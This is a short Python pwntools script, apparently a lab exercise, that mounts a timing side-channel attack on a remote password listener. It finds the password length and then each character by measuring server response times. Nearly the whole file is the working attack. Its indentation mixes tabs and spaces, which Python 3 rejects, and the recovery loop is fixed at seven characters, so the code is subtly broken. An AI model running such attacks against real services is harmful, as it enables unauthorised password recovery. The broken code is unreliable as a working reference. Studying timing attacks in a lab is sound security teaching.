#!/usr/bin/python3
# install python3 pwn tools with
# see https://python3-pwntools.readthedocs.io/en/latest/install.html
#
# $ apt-get update
# $ apt-get install python3 python3-dev python3-pip git
# $ pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git
from pwn import *	# pwntools
import time		# for timing, though the time.time() lib is not usually the best choice for precision timing (it will work in this case)
import string
import operator
# import sys		
''' 
' run_attack
' no params, no return
' this sample code uses pwntwools library to connect to a remote listener
' and send a password guess. The listener port and IP are specified
' within the code below. There is a timer that times the elapsed time to
' send the password guess and receive feedback.
'''
def run_attack():
	remote_IP = '10.0.0.248'	# where the vulnerable program is running
	remote_port = 5514	# the vulnerable program's listening port
	guess = "hello world!"	# password guess - REPLACE THIS WITH GUESSING CODE
	
	guess = ""
	max_resp_time = 0
        max_resp_len = 0
	for x in range(5,11):
		for y in range(x):
			guess+="x"
		
		r = remote(remote_IP, remote_port)	# this creates the remote connection to the listener program
		val = r.recvline()			# receives the prompt
		start = time.time()			# take the current time
		r.sendline(guess + "\n")		# send the guess
		val = r.recvline()			# receive any response
		end = time.time()			# takes the current ime
		elapsed_time = end-start		# calculate elapsed time
		r.close()				# close the connection
		time.sleep(0.02)			# sleep a bit to prevent DOSing listener program
		if elapsed_time > max_resp_time:
			max_resp_time = elapsed_time
			max_resp_len = x
		#print("Guess: " + guess + " length: " + str(len(guess)))
		#print("Elapsed time: " + str(elapsed_time))
		guess = ""
	print("length = "+str(max_resp_len))
	guess = "x"*max_resp_len
	password = ""
	max_resp_time = 0
	max_resp_char = ""
	for i in range(0,7):
		for c in string.printable:
			guess = guess[:i]+ c + guess[i+1:]
			print(guess)
			r = remote(remote_IP, remote_port)      # this creates the remote connection to the listener program
	                val = r.recvline()                      # receives the prompt
	                start = time.time()                     # take the current time
	                r.sendline(guess + "\n")                # send the guess
	                val = r.recvline()                      # receive any response
	                end = time.time()                       # takes the current ime
                	elapsed_time = end-start                # calculate elapsed time
        	        r.close()                               # close the connection
	                time.sleep(0.02)                        # sleep a bit to prevent DOSing listener program	
			if elapsed_time > max_resp_time:
				max_resp_time = elapsed_time
				max_resp_char = c
		guess = guess[:i] + max_resp_char + guess[i+1:]
		password += max_resp_char
		max_resp_time = 0
		print(password)	
	print("password length guess is: " + str(max_resp_len))
	print("password guess is: " + str(password))	
# __main__ function calls the attack code
if __name__ == "__main__":
	run_attack()	# runs the attack
